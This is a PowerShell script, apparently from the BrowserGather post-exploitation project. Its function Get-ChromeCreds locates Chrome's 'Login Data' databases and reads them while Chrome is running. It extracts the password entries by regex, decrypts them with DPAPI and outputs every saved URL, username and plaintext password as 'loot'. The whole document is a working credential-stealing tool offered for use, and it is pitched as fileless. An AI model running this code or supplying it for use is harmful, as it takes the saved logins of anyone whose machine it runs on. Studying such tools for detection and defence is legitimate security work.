# Instructions:
# Import-Module .\Downloads\BrowserGather.ps1
# Get-Help Get-ChromeCreds   or   Get-Help Get-ChromeCookies

function Get-ChromeCreds {

    <#
        Author  :  sekirkity
        Github  :  https://github.com/sekirkity
        
        rewritten by
        Author  :  TheRealNoob
        Github  :  https://github.com/TheRealNoob
    #>

    <#
        .SYNOPSIS
        Searches Google Chrome databases for saved Usernames & Passwords
        .DESCRIPTION
        Extracts Chrome credentials from local databases without writing to disk
        .PARAMETER OutputAsObject
        The default output format is a text/array dump to host.
        This changes the format to storing all Chrome profiles under a single object.  Recommended to save output to a variable.  This is preferable if you plan to do data manipulation.
        Format will look like:

        $Object = [PSCustomObject]@{
            Default = @(
                URL_Username = @()
                Password = @()
            )
            Profile1 = @(
                URL_Username = @()
                Password = @()
            )
            SystemProfile = @(
                URL_Username = @()
                Password = @()
            )
        }

        .EXAMPLE
        Get-ChromeCreds
        .EXAMPLE
        $Variable1 = Get-ChromeCreds -OutputAsObject
        .OUTPUTS
        Default output is a text/array dump to host.  Nice and easy if you want to quickly get info.

        The -OutputAsObject switch changes output format.  See Parameter help section for more info.
        .NOTES
        Help file:
        Get-Help Get-ChromeCreds
        .LINK
        http://sekirkity.com/browsergather-part-1-fileless-chrome-credential-extraction-with-powershell/
        https://github.com/sekirkity/BrowserGather
    #>

    [CmdletBinding()]
    param(
        [Switch]$OutputAsObject
    )

    Add-Type -AssemblyName System.Security # Necessary to perform password decryption
    $OutputObject = New-Object -TypeName psobject
    
    # ******************************
    #
    # Find "Login Data" databases.  This is where the loot is stored.
    #
    # ******************************

    If (Test-Path -Path "$env:localappdata\Google\Chrome\User Data") {
        $LoginDataFiles = (Get-ChildItem -Path "$env:localappdata\Google\Chrome\User Data" -Filter 'Login Data' -Recurse -Force).FullName
    } else {
        Throw 'Chrome database file(s) not found'
    }
    
    If (!(Get-Variable -Name 'LoginDataFiles' -ErrorAction SilentlyContinue)) {
        Throw 'Chrome database file(s) not found'
    }

    Foreach ($LoginDataPath in $LoginDataFiles) {
        
        $ProfileNameFlattened = ([IO.directoryinfo] "$LoginDataPath").Parent.Name.Replace(' ','')
        Write-Verbose -Message "Opening DB file for Profile: $ProfileNameFlattened"

        # ******************************
        #
        # Read from DB file in Read-Only mode
        # This gets around the file lock, allowing us to run without closing Chrome.
        #
        # ******************************
        
	    ## Credit to Matt Graber for his technique on using regular expressions to search for binary data
	    $Stream = New-Object -TypeName IO.FileStream -ArgumentList "$LoginDataPath", 'Open', 'Read', 'ReadWrite'
	    $Encoding = [Text.Encoding]::GetEncoding(28591)
	    $StreamReader = New-Object -TypeName IO.StreamReader -ArgumentList $Stream, $Encoding
	    $LoginDataContent = $StreamReader.ReadToEnd()
	    $StreamReader.Close()
	    $Stream.Close()
        
        # ******************************
        #
        # Find and decrypt password fields
        #
        # ******************************
        
	    ## First the magic bytes for the password. Ends using the "http" for the next entry.
	    $PwdRegex = [Regex] '(\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)[\s\S]*?(?=\x68\x74\x74\x70|\Z)'
	    $PwdListEncrypted = $PwdRegex.Matches($LoginDataContent)
	    $PwdListDecrypted = @()

	    ## Decrypt the password matches and put them in an array
	    Foreach ($Password in $PwdListEncrypted) {
		    $Password = $Encoding.GetBytes($Password)
		    $PwdDecryptedByteArray = [Security.Cryptography.ProtectedData]::Unprotect($Password,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser)
		    $PwdListDecrypted += [Text.Encoding]::Default.GetString($PwdDecryptedByteArray)
	    }
        
        # ******************************
        #
        # Find and URL/Username fields
        # In the DB - URL & Username are stored in separate fields and can be queried that way,
        # but due to the simplicity of the field values and the fact that we're using regex it is not possible to seperate them.
        #
        # ******************************

	    ## Now the magic bytes for URLs/Users. Look behind here is the look ahead for passwords.
	    $UserRegex = [Regex] '(?<=\x0D\x0D\x0D[\s\S]{2}\x68\x74\x74\x70)[\s\S]*?(?=\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)'
	    $UserList = ($UserRegex.Matches($LoginDataContent)).Value
        
        ## Check to see if number of users matches the number of passwords. If the values are different, very likely that there was a regex mismatch.
	    ## All returned values should be treated with caution if this error is presented. May be out of order.
	    If ($UserList.Count -ne $PwdListDecrypted.Count) { 
	        Write-Warning -Message 'Found a different number of usernames and passwords! This is likely due to a regex mismatch.  You may find that your usernames/passwords do not fit together perfectly.'
        }
        

        # ******************************
        #
        #  Format and output everything
        #
        # ******************************
        
        ## Redundancy to figure out what to do in the case of a mismatch
        If ($UserList.count -ne $PwdListDecrypted.Count) {
            If ($UserList.Count -gt -$PwdListDecrypted.Count) {
                $Higher = [int]$UserList.count
            } else {
                $Higher = [int]$PwdListDecrypted.Count
            }
        } else {
            $Higher = [int]$UserList.count # Pick one since it doesn't matter
        }
        
        ## Array stores Username/Password of current Profile
        $OutputArray = New-Object -TypeName System.Collections.ArrayList
        For ($i = 0; $i -le $Higher; $i++) {
            $object = New-Object -TypeName psobject
            $object | Add-Member -MemberType NoteProperty -Name 'URL_Username' -Value $UserList[$i]
            $object | Add-Member -MemberType NoteProperty -Name 'Password' -Value $PwdListDecrypted[$i]
            $OutputArray += $object
        }
        
        $OutputObject | Add-Member -MemberType NoteProperty -Name "$ProfileNameFlattened" -Value $OutputArray
        
        If (!($OutputAsObject)) {
            Write-Output -InputObject "`n`nProfile found: $ProfileNameFlattened`n"
            Write-output -InputObject $OutputArray | Format-List
        }
    }
    
    If ($OutputAsObject) {
        Write-Output -InputObject $OutputObject
    }
}